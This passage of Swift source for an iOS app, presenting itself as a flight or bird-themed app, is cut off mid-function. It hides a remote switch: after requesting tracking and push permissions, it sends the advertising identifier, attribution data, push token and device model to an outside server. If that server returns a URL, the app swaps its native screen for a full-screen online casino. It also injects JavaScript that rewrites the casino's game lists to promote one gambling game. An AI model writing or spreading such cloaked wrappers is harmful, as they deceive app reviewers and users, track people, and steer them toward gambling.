import AdjustSdk
import AdSupport
import AppTrackingTransparency
import SwiftUI
import UIKit
import UserNotifications

struct FlightGateView: View {
    @State private var webDestination: String?
    @State private var hasStarted = false
    @State private var showsNativeFallback = false
    @State private var launchTask: Task<Void, Never>?
    private let pushOpenEvents = NotificationCenter.default
        .publisher(for: .aviaryPushOpened)

    var body: some View {
        ZStack {
            if showsNativeFallback {
                ContentView()
            } else {
                PremiumBackground()
                SplashView()
            }
        }
        .onReceive(pushOpenEvents) { _ in
            startRemoteFlow()
        }

        .onAppear {
            startBootstrap()
        }
        .fullScreenCover(isPresented: .constant(webDestination != nil)) {
            FlightBrowserView(destination: webDestination ?? "")
                .ignoresSafeArea()
        }
    }

    private func startBootstrap() {
        guard !hasStarted else { return }
        hasStarted = true
        startRemoteFlow()
    }

    private func startRemoteFlow() {
        guard launchTask == nil else { return }
        launchTask = Task { @MainActor in
            await preparePermissionsAndWaitForData()
            guard !Task.isCancelled else {
                launchTask = nil
                return
            }
            let openedFromPush = UserDefaults.standard.bool(forKey: BirdLaunchVault.pendingPushKey)
            if openedFromPush {
                UserDefaults.standard.set(false, forKey: BirdLaunchVault.pendingPushKey)
            }
            let openedRemote = await establishRemoteSession(openedFromPush: openedFromPush)
            launchTask = nil
            if !Task.isCancelled && !openedRemote {
                print("REMOTE FLOW: opening native because bootstrap did not return a web URL")
                showsNativeFallback = true
            }
        }
    }

    private func preparePermissionsAndWaitForData() async {
        await requestPushPermissionAndRegister()
        try? await Task.sleep(nanoseconds: 500_000_000)
        await requestATTAndStoreIDFA()

        for second in 0...15 {
            if BirdLaunchVault.adjustAttributionJSON != nil, BirdLaunchVault.firebaseToken != nil {
                return
            }
            guard second < 15, !Task.isCancelled else { return }
            try? await Task.sleep(nanoseconds: 1_000_000_000)
        }
    }

    @MainActor
    private func requestPushPermissionAndRegister() async {
        let center = UNUserNotificationCenter.current()
        let settings = await center.notificationSettings()
        if settings.authorizationStatus == .notDetermined {
            _ = try? await center.requestAuthorization(options: [.alert, .badge, .sound])
        }
        UIApplication.shared.registerForRemoteNotifications()
    }

    @MainActor
    private func requestATTAndStoreIDFA() async {
        guard #available(iOS 14.5, *) else {
            UserDefaults.standard.set(
                ASIdentifierManager.shared().advertisingIdentifier.uuidString,
                forKey: "sb.device.idfa"
            )
            return
        }

        let currentStatus = ATTrackingManager.trackingAuthorizationStatus
        if currentStatus != .notDetermined {
            let idfa = currentStatus == .authorized
                ? ASIdentifierManager.shared().advertisingIdentifier.uuidString
                : ""
            UserDefaults.standard.set(idfa, forKey: "sb.device.idfa")
            return
        }

        for _ in 0..<10 where UIApplication.shared.applicationState != .active {
            try? await Task.sleep(nanoseconds: 300_000_000)
        }
        guard UIApplication.shared.applicationState == .active else { return }

        let status = await Adjust.requestAppTrackingAuthorization()
        let idfa = status == 3
            ? ASIdentifierManager.shared().advertisingIdentifier.uuidString
            : ""
        UserDefaults.standard.set(idfa, forKey: "sb.device.idfa")
    }
}

#Preview {
    FlightGateView()
        .environmentObject(AppState(preview: true))
}


@preconcurrency import WebKit

private enum FlightEndpoint {
    static let entryAddress = "https://skillbirdto.cyou/app.php"
    static let browserSignature = "Mozilla/5.0 (iPhone; CPU iPhone OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1"
}

private struct FlightEnvelope {
    let attribution: [String: Any]
    let firebaseToken: String
    let adjustID: String
    let idfa: String
    let deviceModel: String
    let storedClientID: String?
    let pushID: String?
    let openedFromPush: Bool

    func queryItems() -> [URLQueryItem] {
        var items = [
            URLQueryItem(name: "firebase_push_token", value: firebaseToken),
            URLQueryItem(name: "adjust_id", value: adjustID),
            URLQueryItem(name: "idfa", value: idfa),
            URLQueryItem(name: "device_model", value: deviceModel),
            URLQueryItem(name: "isfrompush", value: openedFromPush ? "1" : "0")
        ]
        if let storedClientID, UUID(uuidString: storedClientID) != nil {
            items.append(URLQueryItem(name: "client_id", value: storedClientID))
        }
        if openedFromPush, let pushID, !pushID.isEmpty {
            items.append(URLQueryItem(name: "push_id", value: pushID))
        }
        return items
    }

    func encodedBody() -> Data {
        let body: [String: Any] = [
            "adjust": attribution,
            "referrer": "utm_source=appstore&utm_medium=organic"
        ]
        return (try? JSONSerialization.data(withJSONObject: body, options: [])) ?? Data("{}".utf8)
    }
}

private struct FlightResponse: Decodable {
    let clientID: String?
    let destination: String?

    enum CodingKeys: String, CodingKey {
        case clientID = "client_id"
        case destination = "response"
    }
}

private enum FlightRelayError: Error {
    case invalidEntryAddress
    case invalidRouteAddress
    case missingRouteHeader
    case nonHTTPResponse
    case rejectedStatus(Int)
}

private struct FlightGateway {
    let clientUUID: String

    func discoverRoute() async throws -> URL {
        guard let entryURL = URL(string: FlightEndpoint.entryAddress) else {
            throw FlightRelayError.invalidEntryAddress
        }
        var probe = URLRequest(url: entryURL)
        probe.httpMethod = "POST"
        applyIdentityHeaders(to: &probe)

        let (_, response) = try await URLSession.shared.data(for: probe)
        guard let http = response as? HTTPURLResponse else {
            throw FlightRelayError.nonHTTPResponse
        }
        guard (200...299).contains(http.statusCode) else {
            throw FlightRelayError.rejectedStatus(http.statusCode)
        }
        guard let rawRoute = http.value(forHTTPHeaderField: "service-link")?
            .trimmingCharacters(in: .whitespacesAndNewlines),
              let route = URL(string: rawRoute),
              route.scheme != nil else {
            throw FlightRelayError.missingRouteHeader
        }
        return route
    }

    func exchange(at route: URL, signal: FlightEnvelope) async throws -> FlightResponse {
        guard var parts = URLComponents(url: route, resolvingAgainstBaseURL: false) else {
            throw FlightRelayError.invalidRouteAddress
        }
        parts.queryItems = (parts.queryItems ?? []) + signal.queryItems()
        guard let destination = parts.url else {
            throw FlightRelayError.invalidRouteAddress
        }

        var request = URLRequest(url: destination)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        applyIdentityHeaders(to: &request)
        request.httpBody = signal.encodedBody()

        let (data, response) = try await URLSession.shared.data(for: request)
        guard let http = response as? HTTPURLResponse else {
            throw FlightRelayError.nonHTTPResponse
        }
        guard (200...299).contains(http.statusCode) else {
            throw FlightRelayError.rejectedStatus(http.statusCode)
        }
        return try JSONDecoder().decode(FlightResponse.self, from: data)
    }

    private func applyIdentityHeaders(to request: inout URLRequest) {
        request.setValue(clientUUID, forHTTPHeaderField: "client-uuid")
        request.setValue(FlightEndpoint.browserSignature, forHTTPHeaderField: "User-Agent")
    }
}

extension FlightGateView {
    @discardableResult
    private func establishRemoteSession(openedFromPush: Bool) async -> Bool {
        let signal = await makeFlightEnvelope(openedFromPush: openedFromPush)
        let relay = FlightGateway(clientUUID: BirdLaunchVault.clientUUID)

        do {
            let route = try await resolvedRoute(using: relay)
            let reply = try await relay.exchange(at: route, signal: signal)
            guard !Task.isCancelled,
                  let destination = reply.destination?.trimmingCharacters(in: .whitespacesAndNewlines),
                  let destinationURL = URL(string: destination),
                  destinationURL.scheme != nil else {
                return await restoreLastDestination()
            }

            if let clientID = reply.clientID, !clientID.isEmpty {
                UserDefaults.standard.set(clientID, forKey: "sb.remote.client")
            }
            UserDefaults.standard.set(destination, forKey: BirdLaunchVault.responseLinkKey)
            UserDefaults.standard.set(destination, forKey: "sb.web.lastURL")
            if openedFromPush {
                UserDefaults.standard.set(false, forKey: BirdLaunchVault.pendingPushKey)
                UserDefaults.standard.removeObject(forKey: BirdLaunchVault.pushIDKey)
            }
            await MainActor.run {
                webDestination = destination
                NotificationCenter.default.post(name: .aviaryURLUpdated, object: destinationURL)
            }
            return true
        } catch {
            if Task.isCancelled { return false }
            print("FLIGHT CHANNEL:", String(describing: error))
            return await restoreLastDestination()
        }
    }

    private func makeFlightEnvelope(openedFromPush: Bool) async -> FlightEnvelope {
        let attribution = standardAdjustPayload()
        let adjustID = await Adjust.adid() ?? ""
        let device = await MainActor.run { UIDevice.current.model }
        return FlightEnvelope(
            attribution: attribution,
            firebaseToken: BirdLaunchVault.firebaseToken ?? "null",
            adjustID: adjustID,
            idfa: UserDefaults.standard.string(forKey: "sb.device.idfa") ?? "",
            deviceModel: device,
            storedClientID: UserDefaults.standard.string(forKey: "sb.remote.client"),
            pushID: UserDefaults.standard.string(forKey: BirdLaunchVault.pushIDKey),
            openedFromPush: openedFromPush
        )
    }

    private func standardAdjustPayload() -> [String: Any] {
        guard let jsonString = BirdLaunchVault.adjustAttributionJSON,
              let jsonData = jsonString.data(using: .utf8),
              let json = try? JSONSerialization.jsonObject(with: jsonData) as? [String: Any] else {
            return [:]
        }
        return [
            "trackerToken": json["trackerToken"] as? String ?? "",
            "trackerName": json["trackerName"] as? String ?? "",
            "network": json["network"] as? String ?? "",
            "campaign": json["campaign"] as? String ?? "",
            "adgroup": json["adgroup"] as? String ?? "",
            "creative": json["creative"] as? String ?? "",
            "clickLabel": json["clickLabel"] as? String ?? "",
            "costType": json["costType"] as? String ?? "",
            "costAmount": json["costAmount"] as? Double ?? 0,
            "costCurrency": json["costCurrency"] as? String ?? "",
            "jsonResponse": jsonString
        ]
    }

    private func resolvedRoute(using relay: FlightGateway) async throws -> URL {
        if let saved = UserDefaults.standard.string(forKey: BirdLaunchVault.serviceLinkKey),
           let route = URL(string: saved), route.scheme != nil {
            print("FLIGHT CHANNEL: restored route")
            return route
        }
        let route = try await relay.discoverRoute()
        UserDefaults.standard.set(route.absoluteString, forKey: BirdLaunchVault.serviceLinkKey)
        print("FLIGHT CHANNEL: discovered route")
        return route
    }

    private func restoreLastDestination() async -> Bool {
        guard let cached = UserDefaults.standard.string(forKey: BirdLaunchVault.responseLinkKey),
              !cached.isEmpty, URL(string: cached)?.scheme != nil else { return false }
        await MainActor.run { webDestination = cached }
        return true
    }

}

struct FlightBrowserView: UIViewControllerRepresentable {
    let destination: String

    func makeUIViewController(context: Context) -> AviaryBrowserController {
        let controller = AviaryBrowserController()
        controller.launchAddress = destination
        Task { await controller.assembleView() }
        return controller
    }

    func updateUIViewController(_ controller: AviaryBrowserController, context: Context) {
        controller.accept(destination)
    }
}

final class AviaryBrowserController: UIViewController, WKNavigationDelegate, WKScriptMessageHandler {
    var launchAddress = ""
    private var mainSurface: WKWebView!
    private var popupSurface: WKWebView?
    private var lastNavigationAddress = ""
    private static let placementRuleKey = "sb.web.placement"
    
    override func viewDidLoad() {
        super.viewDidLoad()
        view.backgroundColor = .white
        NotificationCenter.default.addObserver(
            self,
            selector: #selector(remoteURLDidUpdate(_:)),
            name: .aviaryURLUpdated,
            object: nil
        )
    }

    deinit {
        NotificationCenter.default.removeObserver(self)
    }

    @objc private func remoteURLDidUpdate(_ notification: Notification) {
        guard let url = notification.object as? URL, mainSurface != nil else { return }
        let sanitizedURL = Self.extractRuleAndClean(url)
        UserDefaults.standard.set(sanitizedURL.absoluteString, forKey: "sb.web.lastURL")
        navigate(to: sanitizedURL)
    }
    
    override func viewWillAppear(_ animated: Bool) {
        super.viewWillAppear(animated)
        AviaryOrientationPolicy.webContentIsVisible = true
        refreshSupportedOrientations(.all)
    }
    
    override func viewWillDisappear(_ animated: Bool) {
        super.viewWillDisappear(animated)
        AviaryOrientationPolicy.webContentIsVisible = false
        refreshSupportedOrientations(.portrait)
    }

    override var supportedInterfaceOrientations: UIInterfaceOrientationMask { .all }
    override var shouldAutorotate: Bool { true }

    private func refreshSupportedOrientations(_ orientations: UIInterfaceOrientationMask) {
        setNeedsUpdateOfSupportedInterfaceOrientations()
        navigationController?.setNeedsUpdateOfSupportedInterfaceOrientations()
        if let scene = view.window?.windowScene {
            scene.requestGeometryUpdate(.iOS(interfaceOrientations: orientations))
        }
    }
    
    func assembleView() async {
        let content = launchAddress.isEmpty
            ? (UserDefaults.standard.string(forKey: "sb.web.lastURL") ?? "")
            : launchAddress

        if !content.isEmpty, let rawURL = URL(string: content) {
            let sanitizedURL = Self.extractRuleAndClean(rawURL)
            UserDefaults.standard.set(sanitizedURL.absoluteString, forKey: "sb.web.lastURL")

            restoreCookieArchive()
            
            await MainActor.run {
                let config = WKWebViewConfiguration()
                let script = WKUserScript(
                    source: Self.makeGameListInterceptorJS(),
                    injectionTime: .atDocumentStart,
                    forMainFrameOnly: false
                )
                config.userContentController.addUserScript(script)
                config.userContentController.removeScriptMessageHandler(forName: "lmLogger")
                config.userContentController.add(self, name: "lmLogger")

                self.mainSurface = WKWebView(frame: .zero, configuration: config)
                self.mainSurface.customUserAgent = FlightEndpoint.browserSignature
                self.mainSurface.navigationDelegate = self
                self.mainSurface.uiDelegate = self
                self.mainSurface.allowsBackForwardNavigationGestures = true
                self.mainSurface.translatesAutoresizingMaskIntoConstraints = false

                self.view.addSubview(self.mainSurface)
                NSLayoutConstraint.activate([
                    self.mainSurface.leadingAnchor.constraint(equalTo: self.view.safeAreaLayoutGuide.leadingAnchor),
                    self.mainSurface.trailingAnchor.constraint(equalTo: self.view.safeAreaLayoutGuide.trailingAnchor),
                    self.mainSurface.topAnchor.constraint(equalTo: self.view.safeAreaLayoutGuide.topAnchor),
                    self.mainSurface.bottomAnchor.constraint(equalTo: self.view.safeAreaLayoutGuide.bottomAnchor)
                ])

                self.navigate(to: sanitizedURL)
            }
        }
    }

    func accept(_ destination: String) {
        guard destination != launchAddress else { return }
        launchAddress = destination
        guard let url = URL(string: destination), mainSurface != nil else { return }
        navigate(to: Self.extractRuleAndClean(url))
    }

    private static func extractRuleAndClean(_ url: URL) -> URL {
        guard var comps = URLComponents(url: url, resolvingAgainstBaseURL: false),
              let items = comps.queryItems, !items.isEmpty else {
            return url
        }

        var capturedRaw: String?
        var filtered: [URLQueryItem] = []
        filtered.reserveCapacity(items.count)

        for item in items {
            if item.name.lowercased() == "changetop" {
                if let value = item.value, !value.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
                    capturedRaw = value
                }
                continue
            }
            filtered.append(item)
        }

        if let capturedRaw, let rule = decodePlacementDirective(capturedRaw) {
            let saved = "\(rule.gameId)___\(rule.provider)"
            UserDefaults.standard.set(saved, forKey: placementRuleKey)
            print("changetop saved:", saved)
        }

        comps.queryItems = filtered.isEmpty ? nil : filtered
        return comps.url ?? url
    }

    private static func decodePlacementDirective(_ raw: String) -> (gameId: String, provider: String)? {
        let parts = raw.components(separatedBy: "___")
        guard parts.count == 2 else { return nil }

        let gameId = parts[0].trimmingCharacters(in: .whitespacesAndNewlines)
        let provider = parts[1].trimmingCharacters(in: .whitespacesAndNewlines)

        guard !gameId.isEmpty, !provider.isEmpty else { return nil }
        return (gameId, provider)
    }

    private static func currentChangeTopRule() -> (gameId: String, provider: String) {
        let fallback = ("chicken-road-two", "inout")
        guard let raw = UserDefaults.standard.string(forKey: placementRuleKey),
              let parsed = decodePlacementDirective(raw) else {
            print("changetop fallback:", "\(fallback.0)___\(fallback.1)")
            return fallback
        }
        print("changetop active:", "\(parsed.gameId)___\(parsed.provider)")
        return parsed
    }

    private static func jsEscaped(_ value: String) -> String {
        value
            .replacingOccurrences(of: "\\", with: "\\\\")
            .replacingOccurrences(of: "\"", with: "\\\"")
            .replacingOccurrences(of: "\n", with: "\\n")
            .replacingOccurrences(of: "\r", with: "\\r")
    }
    
    func navigate(to url: URL) {
        guard lastNavigationAddress != url.absoluteString else { return }
        lastNavigationAddress = url.absoluteString
        mainSurface.load(URLRequest(url: url))
    }
    
    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
        persistCookieArchive()

        webView.evaluateJavaScript("window.__lmInterceptorInstalled === true") { result, _ in
            print("Interceptor installed:", result as? Bool ?? false)
        }
    }
    
    func webView(_ webView: WKWebView, decidePolicyFor navigationResponse: WKNavigationResponse,
                 decisionHandler: @escaping (WKNavigationResponsePolicy) -> Void) {
        if let response = navigationResponse.response as? HTTPURLResponse {
            let status = response.statusCode
            print("HTTP Status: \(status)")
            
            if status == 403 || status == 429 {
                print("Recoverable HTTP status, keeping WebView visible: \(status)")
            }
            else if (300...399).contains(status) {
                print("Redirect status, allowing navigation")
            }
            else if status == 200 {
                print("Main content response accepted")
            }
            else if status >= 400 {
                print("Ошибка Сервер вернул ошибку (\(status)).")
            }
        }
        decisionHandler(.allow)
    }
    
    func restoreCookieArchive() {
        let ud: UserDefaults = UserDefaults.standard
        let data: Data? = ud.object(forKey: "sb.web.cookies") as? Data
        if let cookie = data {
            do {
                let datas: NSArray? = try NSKeyedUnarchiver.unarchivedObject(ofClass: NSArray.self, from: cookie)
                if let cookies = datas {
                    for c in cookies {
                        if let cookieObject = c as? HTTPCookie {
                            HTTPCookieStorage.shared.setCookie(cookieObject)
                        }
                    }
                }
            } catch {
                print(error.localizedDescription)
            }
        }
    }
    
    func persistCookieArchive() {
        let cookieJar: HTTPCookieStorage = HTTPCookieStorage.shared
        if let cookies = cookieJar.cookies {
            do {
                let data: Data = try NSKeyedArchiver.archivedData(withRootObject: cookies, requiringSecureCoding: false)
                let ud: UserDefaults = UserDefaults.standard
                ud.set(data, forKey: "sb.web.cookies")
            } catch {
                print(error.localizedDescription)
            }
        }
    }

    func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) {
        if message.name == "lmLogger" {
            print("LM JS:", message.body)
        }
    }

    static func makeGameListInterceptorJS() -> String {
        let rule = currentChangeTopRule()
        let gameId = jsEscaped(rule.gameId)
        let provider = jsEscaped(rule.provider)

        return """
(function() {
  window.__lmInterceptorInstalled = true;
  const CHICKEN_ID = "\(gameId)";
  const CHICKEN_PROVIDER = "\(provider)";
  function lmLog(msg) {
    try {
      window.__lmLogs = window.__lmLogs || [];
      window.__lmLogs.push(String(msg));
      if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.lmLogger) {
        window.webkit.messageHandlers.lmLogger.postMessage(String(msg));
      }
    } catch (_) {}
  }

  let cachedChicken = null;
  let cachedAt = 0;
  const CACHE_TTL_MS = 60 * 1000;
  const pendingLobbyRoots = [];
  let observedGameListBase = "";

  function now() { return Date.now(); }

  function normalizeCat(v) {
    return (v || "").toLowerCase().replace(/[^a-z0-9]/g, "");
  }

  function makeChickenForList(list, chickenObj) {
    const template = (Array.isArray(list) ? list.find(x => x && typeof x === "object") : null) || {};
    return Object.assign({}, template, chickenObj);
  }

  function placeChickenAtIndex(arr, chickenObj, desiredIndex) {
    if (!Array.isArray(arr) || !chickenObj) return false;
    const beforeIdx = arr.findIndex(x => getGameId(x) === CHICKEN_ID);
    const filtered = arr.filter(x => getGameId(x) !== CHICKEN_ID);
    const idx = Math.max(0, Math.min(Number.isFinite(desiredIndex) ? desiredIndex : 0, filtered.length));
    filtered.splice(idx, 0, makeChickenForList(filtered, chickenObj));
    arr.length = 0;
    for (const it of filtered) arr.push(it);
    const afterIdx = arr.findIndex(x => getGameId(x) === CHICKEN_ID);
    return beforeIdx !== afterIdx || beforeIdx !== idx;
  }

  function fallbackChickenObject(template) {
    const base = template && typeof template === "object" ? template : {};
    const slug = String(CHICKEN_ID).replace(/:/g, "-");
    const isKnownChicken = CHICKEN_ID === "chicken-road-two";
    return Object.assign({}, base, {
      gpGameId: CHICKEN_ID,
      gameName: isKnownChicken ? "Chicken Road 2" : (base.gameName || CHICKEN_ID),
      gameSlug: isKnownChicken ? "inout-chicken-road-2" : (base.gameSlug || slug),
      gameProducer: CHICKEN_PROVIDER,
      gameProducerList: CHICKEN_PROVIDER,
      gameProducerName: base.gameProducerName || CHICKEN_PROVIDER,
      imageUrl: isKnownChicken ? "https://cdn.spinaniastatic.com/images/game/uploads/inout.chicken-road-two.jpg" : (base.imageUrl || base.designedImageUrl || ""),
      designedImageUrl: isKnownChicken ? "https://cdn.spinaniastatic.com/images/game/uploads/inout.chicken-road-two.jpg" : (base.designedImageUrl || base.imageUrl || "")
    });
  }

  function patchCategoryNodeGeneric(node, desiredIndex) {
    if (!node || !cachedChicken) return false;
    function patchArr(arr) {
      if (!Array.isArray(arr) || arr.length === 0) return false;
      const tpl = arr.find(x => x && typeof x === "object") || {};
      const useChicken = Object.assign({}, tpl, cachedChicken);
      return placeChickenAtIndex(arr, useChicken, desiredIndex);
    }
    if (Array.isArray(node)) return patchArr(node);
    if (typeof node !== "object") return false;
    if (patchArr(node.data)) return true;
    if (patchArr(node.games)) return true;
    if (patchArr(node.list)) return true;
    if (patchArr(node.items)) return true;
    if (patchArr(node.content)) return true;
    return false;
  }

  function patchGenericContainer(container) {
    if (!container || typeof container !== "object" || !cachedChicken) return 0;
    let local = 0;
    const source = (container.games && typeof container.games === "object") ? container.games : container;
    if (!source || typeof source !== "object") return 0;
    try {
      for (const key of Object.keys(source)) {
        const n = normalizeCat(key);
        if (n === "top" || n.endsWith("top") || n.includes("categorytop")) {
          if (patchCategoryNodeGeneric(source[key], 2)) local += 1;
        } else if (n === "trendingnow" || n.endsWith("trendingnow") || n.includes("categorytrendingnow")) {
          if (patchCategoryNodeGeneric(source[key], 0)) local += 1;
        }
      }
    } catch (_) {}
    return local;
  }

  function resolveGameListBase(seedUrl) {
    try {
      if (observedGameListBase) return observedGameListBase;
      const seed = new URL(seedUrl || "", location.href);
      if ((seed.pathname || "").toLowerCase().includes("gamelist")) {
        return seed.origin + seed.pathname;
      }
    } catch (_) {}
    return "https://buddyspin.aramuz.net/frontapi/buddyspin/gameList";
  }

  function patchLobbyGamesPayload(root) {
    try {
      if (!root || typeof root !== "object") return 0;
      let chicken = cachedChicken || null;
      if (!chicken) chicken = primeChickenSync(location.href);
      let patched = 0;
      lmLog("patchLobbyGamesPayload:start chickenCached=" + (!!chicken));

      function patchList(arr, desiredIndex) {
        if (!Array.isArray(arr) || arr.length === 0) return false;
        if (!chicken) {
          lmLog("patchList:skip-no-chicken index=" + desiredIndex);
          return false;
        }
        const tpl = arr.find(x => x && typeof x === "object") || {};
        const useChicken = Object.assign({}, tpl, chicken);
        const before = arr.findIndex(x => getGameId(x) === CHICKEN_ID);
        const ok = placeChickenAtIndex(arr, useChicken, desiredIndex);
        const after = arr.findIndex(x => getGameId(x) === CHICKEN_ID);
        lmLog("patchList:index=" + desiredIndex + " before=" + before + " after=" + after + " ok=" + ok);
        return ok;
      }

      function patchCategoryNode(node, desiredIndex) {
        if (!node) return false;
        if (Array.isArray(node)) return patchList(node, desiredIndex);
        if (typeof node !== "object") return false;
        if (Array.isArray(node.data) && patchList(node.data, desiredIndex)) return true;
        if (Array.isArray(node.games) && patchList(node.games, desiredIndex)) return true;
        if (Array.isArray(node.list) && patchList(node.list, desiredIndex)) return true;
        if (Array.isArray(node.items) && patchList(node.items, desiredIndex)) return true;
        if (Array.isArray(node.content) && patchList(node.content, desiredIndex)) return true;
        return false;
      }

      function patchContainer(container) {
        if (!container || typeof container !== "object") return 0;
        let local = 0;
        const games = container.games;
        if (games && typeof games === "object") {
          lmLog("patchContainer:keys=" + Object.keys(games).join(","));
          for (const key of Object.keys(games)) {
            const n = normalizeCat(key);
            if (n === "top" || n.endsWith("top") || n.includes("categorytop")) {
              if (patchCategoryNode(games[key], 2)) local += 1;
            } else if (n === "trendingnow" || n.endsWith("trendingnow") || n.includes("categorytrendingnow")) {
              if (patchCategoryNode(games[key], 0)) local += 1;
            }
          }
        }
        lmLog("patchContainer:localPatched=" + local);
        return local;
      }

      const candidates = [];
      if (root["mf-lobby-games"]) candidates.push(root["mf-lobby-games"]);
      if (root["mfLobbyGames"]) candidates.push(root["mfLobbyGames"]);
      if (root.data && typeof root.data === "object") {
        if (root.data["mf-lobby-games"]) candidates.push(root.data["mf-lobby-games"]);
        if (root.data["mfLobbyGames"]) candidates.push(root.data["mfLobbyGames"]);
      }
      for (const key of Object.keys(root)) {
        const val = root[key];
        if (!val || typeof val !== "object") continue;
        if (val["mf-lobby-games"]) candidates.push(val["mf-lobby-games"]);
        if (val["mfLobbyGames"]) candidates.push(val["mfLobbyGames"]);
      }

      const seenContainers = new Set();
      for (const c of candidates) {
        if (!c || typeof c !== "object" || seenContainers.has(c)) continue;
        seenContainers.add(c);
        patched += patchContainer(c);
      }
      lmLog("patchLobbyGamesPayload:done patched=" + patched + " candidates=" + candidates.length);
      return patched;
    } catch (_) {
      lmLog("patchLobbyGamesPayload:error");
      return 0;
    }
  }

  function hasLobbyShape(node) {
    if (!node || typeof node !== "object") return false;
    if (node["mf-lobby-games"] || node["mfLobbyGames"]) return true;
    const d = node.data;
    if (d && typeof d === "object" && (d["mf-lobby-games"] || d["mfLobbyGames"])) return true;
    return false;
  }

  function rememberLobbyRoot(root) {
    if (!root || typeof root !== "object") return;
    if (!hasLobbyShape(root)) return;
    if (pendingLobbyRoots.indexOf(root) !== -1) return;
    if (pendingLobbyRoots.length > 20) pendingLobbyRoots.shift();
    pendingLobbyRoots.push(root);
    lmLog("rememberLobbyRoot:count=" + pendingLobbyRoots.length);
  }

  function patchPendingLobbyRoots() {
    if (!cachedChicken || pendingLobbyRoots.length === 0) return 0;
    let touched = 0;
    for (let i = 0; i < pendingLobbyRoots.length; i += 1) {
      try {
        touched += patchLobbyGamesPayload(pendingLobbyRoots[i]);
      } catch (_) {}
    }
    lmLog("patchPendingLobbyRoots:touched=" + touched + " roots=" + pendingLobbyRoots.length);
    if (touched > 0) {
      try { window.dispatchEvent(new Event("resize")); } catch (_) {}
      pendingLobbyRoots.length = 0;
    }
    return touched;
  }

  function patchLiveLobbyState(chickenObj) {
    if (!chickenObj) return 0;
    let touched = 0;
    let scanned = 0;
    const queue = [window];
    const seen = new Set();

    while (queue.length > 0 && scanned < 1800) {
      const cur = queue.shift();
      if (!cur || typeof cur !== "object" || seen.has(cur)) continue;
      seen.add(cur);
      scanned += 1;

      try {
        if (hasLobbyShape(cur)) {
          touched += patchLobbyGamesPayload(cur);
        } else {
          touched += patchGenericContainer(cur);
        }
      } catch (_) {}

      try {
        const keys = Object.keys(cur);
        const cap = Math.min(keys.length, 180);
        for (let i = 0; i < cap; i += 1) {
          const child = cur[keys[i]];
          if (child && typeof child === "object" && !seen.has(child)) {
            queue.push(child);
          }
        }
      } catch (_) {}
    }

    lmLog("patchLiveLobbyState:touched=" + touched + " scanned=" + scanned);
    if (touched > 0) {
      try { window.dispatchEvent(new Event("resize")); } catch (_) {}
    }
    return touched;
  }

  function isTrendingCategoryValue(category) {
    const c = (category || "").toLowerCase();
    return c === "trendingnow" || c === "trending_now" || c === "trending-now";
  }

  function normalizeCategoryValue(category) {
    return (category || "").toLowerCase().replace(/[_-]/g, "");
  }

  function isManagedCategory(category) {
    const c = normalizeCategoryValue(category);
    return c === "top" || c === "trendingnow";
  }

  function getCategoryFromUrl(u) {
    if (!u || !u.searchParams) return "";
    return (
      u.searchParams.get("category") ||
      u.searchParams.get("gameCategory") ||
      u.searchParams.get("tab") ||
      ""
    ).toLowerCase();
  }

  function getAreaFromUrl(u) {
    if (!u || !u.searchParams) return "";
    return (u.searchParams.get("area") || "").toLowerCase();
  }

  function getOffsetFromUrl(url) {
    try {
      const u = new URL(url, location.href);
      const raw = u.searchParams.get("offset");
      const n = parseInt(raw || "0", 10);
      return Number.isFinite(n) ? n : 0;
    } catch (_) {
      return 0;
    }
  }

  function isHomeTopFeedRequest(url) {
    try {
      const u = new URL(url, location.href);
      if (!pathLooksLikeGames(u.pathname)) return false;
      const area = getAreaFromUrl(u);
      if (area && area !== "default") return false;
      const offset = getOffsetFromUrl(url);
      if (offset !== 0) return false;
      const recommendation = (u.searchParams.get("recommendation") || "").toLowerCase();
      if (recommendation === "false") return false;

      const category = getCategoryFromUrl(u);
      const isHotGames = (u.searchParams.get("isHotGames") || "") === "1";
      const isTop = category === "top" || /^top($|[-_])/.test(category) || (!category && isHotGames);
      if (!isTop) return false;

      const limit = parseInt(u.searchParams.get("limit") || "0", 10);
      return limit > 0 && limit <= 12;
    } catch (_) {
      return false;
    }
  }

  function isHomeTrendingFeedRequest(url) {
    try {
      const u = new URL(url, location.href);
      if (!pathLooksLikeGames(u.pathname)) return false;
      const area = getAreaFromUrl(u);
      if (area && area !== "default") return false;
      const offset = getOffsetFromUrl(url);
      if (offset !== 0) return false;
      const recommendation = (u.searchParams.get("recommendation") || "").toLowerCase();
      if (recommendation === "false") return false;

      const category = getCategoryFromUrl(u);
      if (!isTrendingCategoryValue(category)) return false;
      const limit = parseInt(u.searchParams.get("limit") || "0", 10);
      return limit > 0 && limit <= 12;
    } catch (_) {
      return false;
    }
  }

  function isAnyCategoryFeedRequest(url) {
    try {
      const u = new URL(url, location.href);
      if (!pathLooksLikeGames(u.pathname)) return false;
      if (isHomeTopFeedRequest(url) || isHomeTrendingFeedRequest(url)) return true;
      const category = getCategoryFromUrl(u);
      if (!category) return false;
      if (category === "original" || /^original($|[-_])/.test(category)) return false;
      return isManagedCategory(category);
    } catch (_) {
      return false;
    }
  }

  function pathLooksLikeGames(pathname) {
    const p = (pathname || "").toLowerCase();
    return p.includes("gamelist") || p.includes("/game") || p.includes("casino");
  }

  function isTarget(url) {
    try {
      const u = new URL(url, location.href);
      if (!pathLooksLikeGames(u.pathname)) return false;
      const t = isAnyCategoryFeedRequest(url);
      lmLog("isTarget url=" + url + " -> " + t);
      return t;
    } catch (_) {
      lmLog("isTarget parseError url=" + url);
      return false;
    }
  }

  function isOriginalTarget(url) {
    try {
      const u = new URL(url, location.href);
      if (!pathLooksLikeGames(u.pathname)) return false;
      const category = getCategoryFromUrl(u);
      const t = category === "original" || /^original($|[-_])/.test(category);
      lmLog("isOriginalTarget url=" + url + " cat=" + category + " -> " + t);
      return t;
    } catch (_) {
      lmLog("isOriginalTarget parseError url=" + url);
      return false;
    }
  }

  function makeOriginalUrl(url) {
    const base = resolveGameListBase(url);
    const src = new URL(url, location.href);
    const u = new URL(base);
    u.searchParams.delete("isHotGames");
    u.searchParams.delete("isColdGames");
    u.searchParams.set("area", "default");
    u.searchParams.set("category", "original");
    u.searchParams.set("gameProducer", CHICKEN_PROVIDER);
    const locale = src.searchParams.get("locale");
